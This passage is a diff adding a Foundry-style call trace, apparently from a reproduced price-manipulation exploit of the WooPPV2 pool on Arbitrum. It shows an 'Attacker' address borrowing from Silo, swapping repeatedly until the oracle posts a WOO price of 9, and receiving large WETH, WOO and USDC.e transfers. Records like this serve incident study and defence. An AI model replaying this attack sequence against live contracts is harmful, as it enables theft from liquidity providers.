+    │   │   │   │   │   │   ├─ [12709] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRate(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 1709653326 [1.709e9]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [1163] Silo::utilizationData(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000b79aa4eb400000000000000000000000000000000000000000000000000000006e401a08f70000000000000000000000000000000000000000000000000000000065e73d4e
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [579] 0xDa3abf6F119E2D573e9a56E9679c0f87D4547799::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [426] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::priceProvidersRepository() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005bf4e67127263d951fc515e23b323d0e3b4485fd
+    │   │   │   │   │   │   ├─ [32219] 0x5bf4E67127263D951FC515E23B323d0e3b4485fd::getPrice(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [29006] 0x9d0DDE842801448534263FF23C629EDC6B6B31ee::getPrice(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [16043] 0x5e2b5C5C07cCA3437c4D724225Bb42c7E55d1597::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [7612] 0x807EB1664b774F37E23d7Ea4a384028cC888c511::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 12769 [1.276e4], 56521170 [5.652e7], 1709653195 [1.709e9], 1709653195 [1.709e9], 12769 [1.276e4]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709564385 [1.844e19], 56521170 [5.652e7], 1709653195 [1.709e9], 1709653195 [1.709e9], 18446744073709564385 [1.844e19]
+    │   │   │   │   │   │   │   │   ├─ [3143] 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [1410] 0x3607e46698d218B3a5Cae44bF381475C0a5e2ca7::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 531576 [5.315e5], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 531576 [5.315e5]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073710083192 [1.844e19], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 18446744073710083192 [1.844e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 148417893281550 [1.484e14]
+    │   │   │   │   │   │   │   └─ ← [Return] 148417893281550 [1.484e14]
+    │   │   │   │   │   │   ├─ [5635] WOO::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [4501] 0x3f770Ac673856F105b586bb393d122721265aD46::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   ├─ [579] 0x1d7000d36115dd2116f2401024583b973CaA0D54::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [579] 0x8B94112a3B5669B176015A38C19383a8C0B0c69A::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [2579] 0x80daea7BaeB639cee9cD9eE50d2a52A093A4f20C::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [2579] 0xED3AD20403530B38fb3dFb85273d47765AD2b713::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [2579] 0x51DdFa50752782089d032DD293e4650dAf16F151::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [579] 0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 7000000000000 [7e12]
+    │   │   │   │   │   │   ├─ [872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [12709] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRate(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 1709653326 [1.709e9]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [1163] Silo::utilizationData(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000b79aa4eb400000000000000000000000000000000000000000000000000000006e401a08f70000000000000000000000000000000000000000000000000000000065e73d4e
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [349] 0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 7000000000000 [7e12]
+    │   │   │   │   │   │   ├─ [10819] 0x5bf4E67127263D951FC515E23B323d0e3b4485fd::getPrice(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [9606] 0x9d0DDE842801448534263FF23C629EDC6B6B31ee::getPrice(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3143] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [1410] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 4688, 99997820 [9.999e7], 1709641592 [1.709e9], 1709641592 [1.709e9], 4688
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709556304 [1.844e19], 99997820 [9.999e7], 1709641592 [1.709e9], 1709641592 [1.709e9], 18446744073709556304 [1.844e19]
+    │   │   │   │   │   │   │   │   ├─ [3143] 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [1410] 0x3607e46698d218B3a5Cae44bF381475C0a5e2ca7::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 531576 [5.315e5], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 531576 [5.315e5]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073710083192 [1.844e19], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 18446744073710083192 [1.844e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 262582423137166 [2.625e14]
+    │   │   │   │   │   │   │   └─ ← [Return] 262582423137166 [2.625e14]
+    │   │   │   │   │   │   ├─ [1121] USDCe::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   ├─ [2860] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getMaximumLTV(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000006f05b59d3b20000
+    │   │   │   │   │   │   ├─ [2860] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getMaximumLTV(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000006f05b59d3b20000
+    │   │   │   │   │   │   ├─ [2860] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getMaximumLTV(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000006f05b59d3b20000
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000043669d366fd2cdeb38be300000000000000000000000000000000000000000004348ee5aed2401d9d7460
+    │   │   │   │   │   ├─ [9497] USDCe::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 2000000000000 [2e12])
+    │   │   │   │   │   │   ├─ [8751] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 2000000000000 [2e12]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], value: 2000000000000 [2e12])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [111440] WooPPV2::swap(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], 2000000000000 [2e12], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   ├─ [1296] USDCe::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3949168208532 [3.949e12]
+    │   │   │   │   │   │   │   └─ ← [Return] 3949168208532 [3.949e12]
+    │   │   │   │   │   │   ├─ [25267] WooracleV2::state(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [3143] 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1410] 0x3607e46698d218B3a5Cae44bF381475C0a5e2ca7::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 531576 [5.315e5], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 531576 [5.315e5]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073710083192 [1.844e19], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 18446744073710083192 [1.844e19]
+    │   │   │   │   │   │   │   ├─ [3143] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1410] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 4688, 99997820 [9.999e7], 1709641592 [1.709e9], 1709641592 [1.709e9], 4688
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709556304 [1.844e19], 99997820 [9.999e7], 1709641592 [1.709e9], 1709641592 [1.709e9], 18446744073709556304 [1.844e19]
+    │   │   │   │   │   │   │   └─ ← [Return] State({ price: 381661997086 [3.816e11], spread: 1050000000000000 [1.05e15], coeff: 1000000000 [1e9], woFeasible: true })
+    │   │   │   │   │   │   ├─ [673] WooracleV2::decimals(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
+    │   │   │   │   │   │   ├─ [1121] USDCe::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   ├─ [3076] WETH::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [2336] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   ├─ [10070] WooracleV2::postPrice(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], 383188263412 [3.831e11])
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [28900] WETH::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 522295261244159469020 [5.222e20])
+    │   │   │   │   │   │   │   ├─ [28154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 522295261244159469020 [5.222e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 522295261244159469020 [5.222e20])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  emit topic 0: 0x0e8e403c2d36126272b08c75823e988381d9dc47f2f0a9a080d95f891d95c469
+    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
+    │   │   │   │   │   │   │        topic 2: 0x00000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab1
+    │   │   │   │   │   │   │        topic 3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000001d1a94a200000000000000000000000000000000000000000000000001c504d84dcd7f8a5dc0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000001d1a94a2000000000000000000000000000000000000000000000000000000000001dcd6500
+    │   │   │   │   │   │   └─ ← [Return] 522295261244159469020 [5.222e20]
+    │   │   │   │   │   ├─ [6227] WooracleV2::state(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] State({ price: 56608180 [5.66e7], spread: 5560000000000000 [5.56e15], coeff: 110000000000 [1.1e11], woFeasible: true })
+    │   │   │   │   │   ├─ [4697] USDCe::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 100000000000 [1e11])
+    │   │   │   │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 100000000000 [1e11]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], value: 100000000000 [1e11])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [43302] WooPPV2::swap(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 100000000000 [1e11], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   ├─ [1296] USDCe::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4049168208532 [4.049e12]
+    │   │   │   │   │   │   │   └─ ← [Return] 4049168208532 [4.049e12]
+    │   │   │   │   │   │   ├─ [2227] WooracleV2::state(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] State({ price: 56608180 [5.66e7], spread: 5560000000000000 [5.56e15], coeff: 110000000000 [1.1e11], woFeasible: true })
+    │   │   │   │   │   │   ├─ [689] WooracleV2::decimals(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
+    │   │   │   │   │   │   ├─ [1121] USDCe::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   ├─ [1635] WOO::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [501] 0x3f770Ac673856F105b586bb393d122721265aD46::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   ├─ [4070] WooracleV2::postPrice(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 57853248 [5.785e7])
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [9327] WOO::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 173684596344998196373739 [1.736e23])
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [8187] 0x3f770Ac673856F105b586bb393d122721265aD46::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 173684596344998196373739 [1.736e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 173684596344998196373739 [1.736e23])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  emit topic 0: 0x0e8e403c2d36126272b08c75823e988381d9dc47f2f0a9a080d95f891d95c469
+    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000cafcd85d8ca7ad1e1c6f82f651fa15e33aefd07b
+    │   │   │   │   │   │   │        topic 3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000174876e8000000000000000000000000000000000000000000000024c775f93b58766368eb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000174876e80000000000000000000000000000000000000000000000000000000000017d7840
+    │   │   │   │   │   │   └─ ← [Return] 173684596344998196373739 [1.736e23]
+    │   │   │   │   │   ├─ [2227] WooracleV2::state(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] State({ price: 57853248 [5.785e7], spread: 5560000000000000 [5.56e15], coeff: 110000000000 [1.1e11], woFeasible: true })
+    │   │   │   │   │   ├─ [4527] WOO::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 7856868800000000000000000 [7.856e24])
+    │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   ├─ [3387] 0x3f770Ac673856F105b586bb393d122721265aD46::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 7856868800000000000000000 [7.856e24]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], value: 7856868800000000000000000 [7.856e24])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [31538] WooPPV2::swap(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 7856868800000000000000000 [7.856e24], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   ├─ [1602] WOO::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 10235471897423661362958035 [1.023e25]
+    │   │   │   │   │   │   │   └─ ← [Return] 10235471897423661362958035 [1.023e25]
+    │   │   │   │   │   │   ├─ [2227] WooracleV2::state(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] State({ price: 57853248 [5.785e7], spread: 5560000000000000 [5.56e15], coeff: 110000000000 [1.1e11], woFeasible: true })
+    │   │   │   │   │   │   ├─ [689] WooracleV2::decimals(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
+    │   │   │   │   │   │   ├─ [1121] USDCe::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   ├─ [1635] WOO::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [501] 0x3f770Ac673856F105b586bb393d122721265aD46::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   ├─ [1270] WooracleV2::postPrice(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 9)
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [4697] USDCe::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2246892686007 [2.246e12])
+    │   │   │   │   │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2246892686007 [2.246e12]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2246892686007 [2.246e12])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  emit topic 0: 0x0e8e403c2d36126272b08c75823e988381d9dc47f2f0a9a080d95f891d95c469
+    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000cafcd85d8ca7ad1e1c6f82f651fa15e33aefd07b
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
+    │   │   │   │   │   │   │        topic 3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000067fc1b60a4d06496000000000000000000000000000000000000000000000000000000000020b253d8ab70000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000020b46bae68c00000000000000000000000000000000000000000000000000000000217d5bd5
+    │   │   │   │   │   │   └─ ← [Return] 2246892686007 [2.246e12]
+    │   │   │   │   │   ├─ [2227] WooracleV2::state(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] State({ price: 9, spread: 5560000000000000 [5.56e15], coeff: 110000000000 [1.1e11], woFeasible: true })
+    │   │   │   │   │   ├─ [647] WooPPV2::poolSize(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 10235471897423661362958035 [1.023e25]
+    │   │   │   │   │   ├─ [1296] USDCe::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 3723339262019 [3.723e12]
+    │   │   │   │   │   │   └─ ← [Return] 3723339262019 [3.723e12]
+    │   │   │   │   │   ├─ [4697] USDCe::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 926342 [9.263e5])
+    │   │   │   │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 926342 [9.263e5]) [delegatecall]
